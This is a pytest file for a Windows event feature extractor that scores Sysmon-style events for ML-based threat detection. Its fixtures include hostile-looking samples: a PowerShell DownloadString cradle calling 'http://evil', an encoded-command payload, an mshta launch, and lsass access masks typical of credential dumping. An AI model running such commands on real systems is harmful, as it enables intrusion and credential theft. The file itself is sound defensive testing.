"""Tests for Phase 5 per-event feature extractor."""

from __future__ import annotations

from datetime import datetime

from ml.features.extractor import EventFeatureExtractor, shannon_entropy
from ml.features.feature_spec import default_feature_vector


def _event(event_type_id: int, raw: dict | None = None, **flat) -> dict:
    """Minimal synthetic event shaped like EventRecord.to_dict()."""
    base = {
        "id": 1,
        "event_type_id": event_type_id,
        "timestamp": datetime(2026, 7, 14, 10, 0, 0),
        "pid": 1234,
        "image": r"C:\Windows\System32\notepad.exe",
        "raw_json": raw if raw is not None else {},
        "ingested_at": datetime(2026, 7, 14, 10, 0, 1),
    }
    base.update(flat)
    return base


# ---------------------------------------------------------------------------
# EID 1 — ProcessCreate
# ---------------------------------------------------------------------------


def test_eid1_encoded_command_detected():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "powershell.exe -EncodedCommand SQBFAFgA",
            "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    )
    assert ext.extract(event)["has_encoded_command"] == 1


def test_eid1_encoded_command_not_detected_for_normal_cmd():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "cmd.exe /c dir",
            "image": r"C:\Windows\System32\cmd.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
        image=r"C:\Windows\System32\cmd.exe",
    )
    assert ext.extract(event)["has_encoded_command"] == 0


def test_eid1_download_keyword_detected():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": (
                "powershell.exe -c "
                "(New-Object Net.WebClient).DownloadString('http://evil')"
            ),
            "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    )
    assert ext.extract(event)["has_download_keyword"] == 1


def test_eid1_cmd_entropy_nonzero_for_encoded():
    ext = EventFeatureExtractor()
    b64 = (
        "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZS"
    )
    event = _event(
        1,
        {
            "command_line": f"powershell.exe -EncodedCommand {b64}",
            "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
    )
    assert ext.extract(event)["cmd_entropy"] > 4.0


def test_eid1_cmd_entropy_zero_for_empty():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": None,
            "image": r"C:\Windows\System32\cmd.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
    )
    assert ext.extract(event)["cmd_entropy"] == 0.0


def test_eid1_is_lolbin_mshta():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "mshta.exe evil.hta",
            "image": r"C:\Windows\System32\mshta.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
        image=r"C:\Windows\System32\mshta.exe",
    )
    assert ext.extract(event)["is_lolbin"] == 1


def test_eid1_is_lolbin_false_for_notepad():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "notepad.exe",
            "image": r"C:\Windows\System32\notepad.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
        image=r"C:\Windows\System32\notepad.exe",
    )
    assert ext.extract(event)["is_lolbin"] == 0


def test_eid1_suspicious_parent_winword():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "powershell.exe",
            "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_image": r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
            "parent_command_line": "WINWORD.EXE",
        },
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    )
    assert ext.extract(event)["is_suspicious_parent"] == 1


def test_eid1_known_suspicious_chain_winword_powershell():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "powershell.exe -nop",
            "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_image": r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
            "parent_command_line": "WINWORD.EXE doc.docx",
        },
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    )
    assert ext.extract(event)["is_known_suspicious_chain"] == 1


def test_eid1_parent_is_same_image_true():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "powershell.exe -nop",
            "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_command_line": "powershell.exe",
        },
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    )
    assert ext.extract(event)["parent_is_same_image"] == 1


def test_eid1_is_off_hours_true():
    """hour_of_day / is_off_hours with timestamp as datetime object."""
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "cmd.exe",
            "image": r"C:\Windows\System32\cmd.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
        timestamp=datetime(2026, 7, 14, 2, 0, 0),
    )
    vec = ext.extract(event)
    assert vec["hour_of_day"] == 2
    assert vec["is_off_hours"] == 1


def test_eid1_is_off_hours_false():
    """hour_of_day / is_off_hours with timestamp as ISO string."""
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "cmd.exe",
            "image": r"C:\Windows\System32\cmd.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
        },
        timestamp="2026-07-14T10:00:00",
    )
    vec = ext.extract(event)
    assert vec["hour_of_day"] == 10
    assert vec["is_off_hours"] == 0


def test_eid1_is_signed_always_zero():
    """EID 1 has no signed field — is_signed must remain 0 regardless of input."""
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "notepad.exe",
            "image": r"C:\Windows\System32\notepad.exe",
            "parent_image": r"C:\Windows\explorer.exe",
            "parent_command_line": "explorer.exe",
            "signed": True,  # must be ignored — not a real EID-1 field
        },
    )
    assert ext.extract(event)["is_signed"] == 0


def test_eid1_none_image_does_not_raise():
    ext = EventFeatureExtractor()
    event = _event(
        1,
        {
            "command_line": "unknown",
            "image": None,
            "parent_image": None,
            "parent_command_line": None,
        },
        image=None,
    )
    vec = ext.extract(event)
    assert vec["is_lolbin"] == 0
    assert vec["is_suspicious_parent"] == 0
    assert vec["is_known_suspicious_chain"] == 0
    assert vec["parent_is_same_image"] == 0


# ---------------------------------------------------------------------------
# EID 3 — NetworkConnect
# ---------------------------------------------------------------------------


def test_eid3_suspicious_port_4444():
    ext = EventFeatureExtractor()
    event = _event(
        3,
        {"destination_ip": "8.8.8.8", "destination_port": 4444, "process_id": 100},
    )
    assert ext.extract(event)["is_suspicious_port"] == 1
    assert ext.extract(event)["dest_port"] == 4444


def test_eid3_normal_port_443():
    ext = EventFeatureExtractor()
    event = _event(
        3,
        {"destination_ip": "8.8.8.8", "destination_port": 443, "process_id": 100},
    )
    assert ext.extract(event)["is_suspicious_port"] == 0


def test_eid3_external_ip_detected():
    ext = EventFeatureExtractor()
    event = _event(
        3,
        {"destination_ip": "8.8.8.8", "destination_port": 443, "process_id": 100},
    )
    assert ext.extract(event)["is_external_ip"] == 1


def test_eid3_internal_ip_not_flagged():
    ext = EventFeatureExtractor()
    event = _event(
        3,
        {"destination_ip": "192.168.1.1", "destination_port": 443, "process_id": 100},
    )
    assert ext.extract(event)["is_external_ip"] == 0


def test_eid3_loopback_not_flagged():
    ext = EventFeatureExtractor()
    event = _event(
        3,
        {"destination_ip": "127.0.0.1", "destination_port": 80, "process_id": 100},
    )
    assert ext.extract(event)["is_external_ip"] == 0


def test_eid3_null_ip_does_not_raise():
    ext = EventFeatureExtractor()
    event = _event(
        3,
        {"destination_ip": None, "destination_port": 80, "process_id": 100},
    )
    assert ext.extract(event)["is_external_ip"] == 0


def test_eid3_network_event_count_is_1():
    ext = EventFeatureExtractor()
    event = _event(
        3,
        {"destination_ip": "1.1.1.1", "destination_port": 53, "process_id": 100},
    )
    assert ext.extract(event)["network_event_count"] == 1


# ---------------------------------------------------------------------------
# EID 7 — ImageLoad (signed is only real here)
# ---------------------------------------------------------------------------


def test_eid7_unsigned_image_flagged():
    ext = EventFeatureExtractor()
    event = _event(7, {"signed": "false", "process_id": 100, "image": r"C:\temp\x.dll"})
    assert ext.extract(event)["unsigned_image_loaded"] == 1


def test_eid7_signed_true_bool():
    ext = EventFeatureExtractor()
    event = _event(7, {"signed": True, "process_id": 100, "image": r"C:\Windows\a.dll"})
    assert ext.extract(event)["unsigned_image_loaded"] == 0


def test_eid7_signed_true_string():
    ext = EventFeatureExtractor()
    event = _event(7, {"signed": "true", "process_id": 100, "image": r"C:\Windows\a.dll"})
    assert ext.extract(event)["unsigned_image_loaded"] == 0


def test_eid7_signed_false():
    ext = EventFeatureExtractor()
    event = _event(7, {"signed": False, "process_id": 100, "image": r"C:\temp\x.dll"})
    assert ext.extract(event)["unsigned_image_loaded"] == 1


def test_eid7_image_load_count_is_1():
    ext = EventFeatureExtractor()
    event = _event(7, {"signed": True, "process_id": 100, "image": r"C:\Windows\a.dll"})
    assert ext.extract(event)["image_load_count"] == 1


# ---------------------------------------------------------------------------
# EID 8 — CreateRemoteThread
# ---------------------------------------------------------------------------


def test_eid8_create_remote_thread_count_is_1():
    ext = EventFeatureExtractor()
    event = _event(
        8,
        {
            "source_process_id": 100,
            "source_image": r"C:\Windows\System32\cmd.exe",
            "target_process_id": 200,
            "target_image": r"C:\Windows\System32\notepad.exe",
        },
    )
    assert ext.extract(event)["create_remote_thread_count"] == 1


# ---------------------------------------------------------------------------
# EID 10 — OpenProcess (granted_access, not access_mask)
# ---------------------------------------------------------------------------


def test_eid10_lsass_target_detected():
    ext = EventFeatureExtractor()
    event = _event(
        10,
        {
            "source_process_id": 100,
            "source_image": r"C:\temp\mal.exe",
            "target_process_id": 700,
            "target_image": r"C:\Windows\System32\lsass.exe",
            "granted_access": "0x1010",
        },
    )
    assert ext.extract(event)["open_process_lsass_target"] == 1


def test_eid10_lsass_target_not_flagged_for_other():
    ext = EventFeatureExtractor()
    event = _event(
        10,
        {
            "source_process_id": 100,
            "source_image": r"C:\temp\mal.exe",
            "target_process_id": 700,
            "target_image": r"C:\Windows\explorer.exe",
            "granted_access": "0x1010",
        },
    )
    assert ext.extract(event)["open_process_lsass_target"] == 0


def test_eid10_suspicious_access_vm_read():
    ext = EventFeatureExtractor()
    event = _event(
        10,
        {
            "source_process_id": 100,
            "source_image": r"C:\temp\mal.exe",
            "target_process_id": 700,
            "target_image": r"C:\Windows\System32\lsass.exe",
            "granted_access": "0x0010",
        },
    )
    assert ext.extract(event)["open_process_suspicious_access"] == 1


def test_eid10_suspicious_access_all_access_hex():
    ext = EventFeatureExtractor()
    event = _event(
        10,
        {
            "source_process_id": 100,
            "source_image": r"C:\temp\mal.exe",
            "target_process_id": 700,
            "target_image": r"C:\Windows\System32\lsass.exe",
            "granted_access": "0x1F0FFF",
        },
    )
    assert ext.extract(event)["open_process_suspicious_access"] == 1


def test_eid10_normal_access_not_flagged():
    ext = EventFeatureExtractor()
    event = _event(
        10,
        {
            "source_process_id": 100,
            "source_image": r"C:\temp\tool.exe",
            "target_process_id": 700,
            "target_image": r"C:\Windows\System32\notepad.exe",
            "granted_access": "0x0400",
        },
    )
    assert ext.extract(event)["open_process_suspicious_access"] == 0


def test_eid10_null_access_mask_does_not_raise():
    ext = EventFeatureExtractor()
    event = _event(
        10,
        {
            "source_process_id": 100,
            "source_image": r"C:\temp\tool.exe",
            "target_process_id": 700,
            "target_image": r"C:\Windows\System32\notepad.exe",
            "granted_access": None,
        },
    )
    assert ext.extract(event)["open_process_suspicious_access"] == 0


def test_eid10_open_process_count_is_1():
    ext = EventFeatureExtractor()
    event = _event(
        10,
        {
            "source_process_id": 100,
            "source_image": r"C:\temp\tool.exe",
            "target_process_id": 700,
            "target_image": r"C:\Windows\System32\notepad.exe",
            "granted_access": "0x0400",
        },
    )
    assert ext.extract(event)["open_process_count"] == 1


# ---------------------------------------------------------------------------
# EID 22 — DnsQuery
# ---------------------------------------------------------------------------


def test_eid22_dns_query_length():
    ext = EventFeatureExtractor()
    event = _event(
        22,
        {"query_name": "evil.example.com", "process_id": 100},
    )
    assert ext.extract(event)["dns_query_length"] == 16


def test_eid22_dns_null_query_does_not_raise():
    ext = EventFeatureExtractor()
    event = _event(22, {"query_name": None, "process_id": 100})
    assert ext.extract(event)["dns_query_length"] == 0


def test_eid22_network_event_count_is_1():
    ext = EventFeatureExtractor()
    event = _event(22, {"query_name": "cdn.example.com", "process_id": 100})
    assert ext.extract(event)["network_event_count"] == 1


# ---------------------------------------------------------------------------
# Unknown EID + shannon entropy
# ---------------------------------------------------------------------------


def test_unknown_eid_returns_default_vector():
    ext = EventFeatureExtractor()
    event = _event(999, {})
    assert ext.extract(event) == default_feature_vector()


def test_shannon_entropy_empty_string():
    assert shannon_entropy("") == 0.0
    assert shannon_entropy(None) == 0.0


def test_shannon_entropy_uniform_string():
    assert shannon_entropy("aaaa") == 0.0


def test_shannon_entropy_high_for_random():
    # Varied base64-like alphabet — high character diversity → high entropy
    s = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0KkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz+/"
    assert len(s) == 64
    assert shannon_entropy(s) > 4.0
